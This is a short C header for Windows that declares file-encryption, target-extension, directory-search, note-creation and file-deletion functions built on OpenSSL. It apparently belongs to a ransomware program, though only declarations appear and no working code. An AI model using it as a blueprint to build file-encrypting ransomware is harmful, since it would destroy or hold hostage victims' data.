#pragma once
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <io.h>
#include <Windows.h>
#include <TlHelp32.h>
#include <tchar.h>

#ifndef __FILE_H__
#define __FILE_H__

int Encrypt(FILE *inFp, FILE *outFp, const EVP_CIPHER *cipher,
	const unsigned char *key, const unsigned char *iv);
int isFileOrDir();
int isTarget(char* fileExtension);
void SearchFile(char path[], const EVP_CIPHER *cipher, int mode, unsigned char *key, unsigned char *iv);
void CreateNote();
int DeleteExpired(char *path);
#endif // !__FILE_H__
